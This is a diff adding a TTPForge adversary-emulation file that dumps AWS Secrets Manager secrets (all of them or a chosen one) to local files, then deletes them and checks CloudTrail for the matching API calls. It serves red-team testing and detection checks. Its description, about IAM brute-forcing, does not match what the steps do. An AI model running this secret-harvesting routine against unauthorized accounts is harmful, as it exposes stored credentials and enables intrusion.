@@ -1,0 +1,144 @@
+---
+api_version: 2.0
+uuid: 1e7fbacb-fe75-4b7c-ae0d-857984342a87
+name: steal-secretsmanager-secret
+authors:
+  - d3sch41n
+  - I50
+description: |
+  Determine what permissions an IAM role has through
+  brute force using the
+  [enumerate-iam](https://github.com/andresriancho/enumerate-iam) tool.
+args:
+  - name: detect
+    default: true
+  - name: target_secret_id
+  - name: artifact_output_dir
+    default: $HOME/.ttpforge/artifacts/steal-secretsmanager-secret
+
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+
+mitre:
+  tactics:
+    - "TA0009 Collection"
+  techniques:
+    - "T1530 Data from Cloud Storage Object"
+
+steps:
+  - name: ensure-aws-creds-present
+    inline: |
+      set -e
+
+      if [[ -z "${AWS_DEFAULT_REGION}" ]]; then
+          echo "Error: AWS_DEFAULT_REGION must be set."
+          exit 1
+      fi
+      if [[ -n "${AWS_ACCESS_KEY_ID}" && -n "${AWS_SECRET_ACCESS_KEY}" ]]; then
+          if [[ -z "${AWS_SESSION_TOKEN}" ]]; then
+            echo "Warning: AWS_SESSION_TOKEN is not set with AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY."
+          fi
+      elif [[ -z "${AWS_PROFILE}" ]]; then
+          echo "Error: AWS credentials are not set, exiting."
+          exit 1
+      fi
+
+  - name: ensure-aws-cli-present
+    inline: |
+      set -e
+
+      if ! [ -x "$(command -v aws)" ]; then
+        echo 'Error: AWS CLI is not installed.' >&2
+      else
+        echo -e "AWS CLI is installed: $(aws --version)"
+      fi
+
+  - name: steal-secret
+    inline: |
+      set -e
+
+      if [[ ! -d "{{ .Args.artifact_output_dir }}" ]]; then
+        echo -e "Creating artifacts directory ({{ .Args.artifact_output_dir }}) to store TTP output"
+        mkdir -p "{{ .Args.artifact_output_dir }}"
+      fi
+
+      if [[ "{{ .Args.target_secret_id }}" == all ]]; then
+          echo "Retrieving all secrets accessible in secretsmanager for the specified AWS_DEFAULT_REGION ($AWS_DEFAULT_REGION)"
+          SECRETS_LIST=$(aws secretsmanager list-secrets --region "${AWS_DEFAULT_REGION}" | jq -r '.SecretList[].Name')
+          for SECRET in $SECRETS_LIST; do
+              # Forward slashes (/) are common in secret names.
+              # This can cause issues during directory creation, so we
+              # handle this case by converting any forward slashes to underscores.
+              sanitized_secret_name=$(echo "$SECRET" | sed 's:/:_:g')
+              output_filename="{{ .Args.artifact_output_dir }}/${sanitized_secret_name}.json"
+              stolen_content="$(aws secretsmanager get-secret-value --secret-id "$SECRET" \
+                --region "${AWS_DEFAULT_REGION}" | jq -r .SecretString)"
+
+              if [[ -z "$stolen_content" ]]; then
+                  echo "No content fetched from the secret: $SECRET"
+              else
+                  echo "$stolen_content" > $output_filename
+              fi
+          done
+      else
+          sanitized_secret_id=$(echo "{{ .Args.target_secret_id }}" | sed 's:/:_:g')
+          output_filename="{{ .Args.artifact_output_dir }}/${sanitized_secret_id}.json"
+          stolen_content="$(aws secretsmanager get-secret-value --secret-id "{{ .Args.target_secret_id }}" \
+            --region "${AWS_DEFAULT_REGION}" | jq -r .SecretString)"
+
+          if [[ -z "$stolen_content" ]]; then
+              echo "No content fetched from the secret: {{ .Args.target_secret_id }}"
+          else
+              echo "$stolen_content" > $output_filename
+          fi
+      fi
+      echo "{{ .Args.artifact_output_dir }}"
+    cleanup:
+      inline: |
+        set -e
+
+        echo "Deleting pillaged secret(s)"
+        rm -rf "{{ .Args.artifact_output_dir }}"
+
+  - name: check-detection
+    inline: |
+      set -e
+
+      if [[ "{{ .Args.detect }}" == true ]]; then
+          current_time() {
+            date -u +'%Y-%m-%dT%H:%M:%SZ'
+          }
+
+          ten_minutes_ago() {
+          if [[ "$OSTYPE" == "darwin"* ]]; then
+              date -v-10M -u +'%Y-%m-%dT%H:%M:%SZ'
+          else
+              date -u -d '10 minutes ago' +'%Y-%m-%dT%H:%M:%SZ'
+          fi
+          }
+
+          START_TIME=$(ten_minutes_ago)
+          END_TIME=$(current_time)
+
+          API_CALLS=("GetSecretValue" "ListSecrets")
+
+          for api_call in "${API_CALLS[@]}"; do
+          EVENTS=$(aws cloudtrail lookup-events \
+              --lookup-attributes AttributeKey=EventName,AttributeValue=$api_call \
+              --start-time $START_TIME \
+              --end-time $END_TIME \
+              --region us-east-1)
+
+          if echo "$EVENTS" | jq -e '.Events[] | select(.EventName=="'$api_call'")' > /dev/null; then
+              echo "EventTime EventName SecretId EventSource Region AccessKeyId SourceIPAddress"
+              DETAILS=$(echo "$EVENTS" | jq -r '.Events[] | "\(.EventTime) \(.EventName) \((.CloudTrailEvent | fromjson).requestParameters.secretId) \(.EventSource) \((.CloudTrailEvent | fromjson).awsRegion) \((.CloudTrailEvent | fromjson).userIdentity.accessKeyId) \((.CloudTrailEvent | fromjson).sourceIPAddress)"')
+
+              echo "$DETAILS"
+
+          else
+              echo "No $api_call event detected in the last 10 minutes"
+          fi
+          done
+      fi
